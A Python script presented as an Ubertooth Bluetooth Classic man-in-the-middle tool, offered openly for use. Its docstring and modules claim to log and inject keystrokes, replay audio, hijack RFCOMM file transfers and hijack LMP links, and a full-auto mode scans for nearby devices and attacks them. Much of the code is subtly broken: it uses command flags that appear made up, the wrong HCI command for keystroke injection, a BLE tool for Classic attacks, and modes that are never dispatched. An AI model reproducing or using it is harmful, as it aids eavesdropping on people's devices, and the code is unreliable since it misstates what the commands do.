import argparse
import subprocess
import time
import json
import os

"""
Ubertooth Bluetooth Classic MITM

Features:
    - Sniffs & modifies Bluetooth Classic (BR/EDR) packets in real-time.
    - Logs keystrokes from Bluetooth keyboards.
    - Injects keystrokes into Bluetooth HID devices.
    - Captures and replays Bluetooth audio streams (headsets, car audio).
    - Hijacks file transfers over RFCOMM & extracts data.
    - Performs active LMP (Link Management Protocol) hijacking.
    - Supports full automation or individual attack modules.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Additional tools: bluez, btmon

Usage:
    - Run full Classic Bluetooth MITM attack:
      python ubertooth_bt_classic_mitm.py --full-auto
    - Intercept Bluetooth keyboard keystrokes:
      python ubertooth_bt_classic_mitm.py --target AA:BB:CC:DD:EE:FF --hid-log
    - Inject keystrokes into a Bluetooth keyboard:
      python ubertooth_bt_classic_mitm.py --target AA:BB:CC:DD:EE:FF --hid-inject "Hello World!"
    - Capture and replay Bluetooth audio:
      python ubertooth_bt_classic_mitm.py --target AA:BB:CC:DD:EE:FF --audio-replay
    - Hijack an active file transfer & extract files:
      python ubertooth_bt_classic_mitm.py --target AA:BB:CC:DD:EE:FF --file-sniff
    - Perform a full LMP hijack & persist as a MITM:
      python ubertooth_bt_classic_mitm.py --target AA:BB:CC:DD:EE:FF --lmp-hijack
"""

LOG_FILE = "bt_classic_mitm_log.json"

def log_event(event_data):
    """Logs attack events and intercepted packets."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        
        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)
    
    except Exception as e:
        print(f"[ERROR] Failed to log event: {e}")

def scan_bluetooth_classic():
    """Scans for Bluetooth Classic devices."""
    print("[INFO] Scanning for Bluetooth Classic devices...")

    try:
        output = subprocess.check_output(["hcitool", "scan"])
        devices = output.decode("utf-8").split("\n")[1:]

        detected_devices = {}
        for line in devices:
            parts = line.split("\t")
            if len(parts) > 1:
                mac_address = parts[1]
                detected_devices[mac_address] = {"device_type": "Classic", "last_seen": time.time()}
                print(f"[DETECTED] Classic Bluetooth Device: {mac_address}")

                log_event({"event": "Classic Device Detected", "mac": mac_address})

        return detected_devices

    except Exception as e:
        print(f"[ERROR] Failed to scan for Bluetooth Classic devices: {e}")
        return {}

def capture_hid_keystrokes(target_mac):
    """Captures keystrokes from a Bluetooth keyboard."""
    print(f"[INFO] Capturing keystrokes from {target_mac}...")

    try:
        subprocess.run(["btmon", "--dump", "--filter", "hid"], stdout=subprocess.PIPE, text=True)
        log_event({"event": "HID Keystrokes Captured", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to capture keystrokes: {e}")

def inject_hid_keystrokes(target_mac, keystrokes):
    """Injects keystrokes into a Bluetooth keyboard."""
    print(f"[INFO] Injecting keystrokes into {target_mac}...")

    try:
        subprocess.run(["hcitool", "cmd", "0x04", "0x05", keystrokes])
        log_event({"event": "HID Keystrokes Injected", "target_mac": target_mac, "keystrokes": keystrokes})

    except Exception as e:
        print(f"[ERROR] Failed to inject keystrokes: {e}")

def hijack_rfc_transfer(target_mac):
    """Hijacks file transfers over Bluetooth RFCOMM."""
    print(f"[INFO] Hijacking file transfers from {target_mac}...")

    try:
        subprocess.run(["rfcomm", "listen", "/dev/rfcomm0", "1"])
        log_event({"event": "File Transfer Hijacked", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to hijack file transfers: {e}")

def replay_audio(target_mac):
    """Replays captured Bluetooth audio packets."""
    print(f"[INFO] Replaying Bluetooth audio to {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--audio-replay"])
        log_event({"event": "Audio Replay Attack", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to replay audio: {e}")

def perform_lmp_hijack(target_mac):
    """Performs an LMP hijack to persist as a MITM."""
    print(f"[INFO] Hijacking LMP (Link Management Protocol) for {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--lmp-hijack"])
        log_event({"event": "LMP Hijack", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to perform LMP hijack: {e}")

def auto_classic_mitm():
    """Runs the full Classic Bluetooth MITM automation."""
    print("[INFO] Running full Bluetooth Classic MITM...")

    devices = scan_bluetooth_classic()
    if not devices:
        print("[ERROR] No Classic Bluetooth devices found. Exiting.")
        return

    target_mac = max(devices, key=lambda k: devices[k]["last_seen"])
    print(f"[TARGET] Selected {target_mac} for attack.")

    capture_hid_keystrokes(target_mac)
    time.sleep(2)

    inject_hid_keystrokes(target_mac, "Hello World!")
    time.sleep(2)

    hijack_rfc_transfer(target_mac)
    time.sleep(3)

    replay_audio(target_mac)
    time.sleep(4)

    perform_lmp_hijack(target_mac)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Classic MITM")
    parser.add_argument("--full-auto", action="store_true", help="Run full Bluetooth Classic MITM attack")
    parser.add_argument("--target", type=str, help="Specify target MAC address for attack")
    parser.add_argument("--hid-log", action="store_true", help="Capture keystrokes from Bluetooth keyboards")
    parser.add_argument("--hid-inject", type=str, help="Inject keystrokes into a Bluetooth keyboard")
    parser.add_argument("--file-sniff", action="store_true", help="Hijack and extract file transfers")
    parser.add_argument("--audio-replay", action="store_true", help="Replay captured Bluetooth audio")
    parser.add_argument("--lmp-hijack", action="store_true", help="Perform a full LMP hijack & persist as MITM")

    args = parser.parse_args()

    if args.full_auto:
        auto_classic_mitm()
    elif args.hid_log and args.target:
        capture_hid_keystrokes(args.target)
    elif args.hid_inject and args.target:
        inject_hid_keystrokes(args.target, args.hid_inject)
    else:
        print("[ERROR] No valid mode selected!")
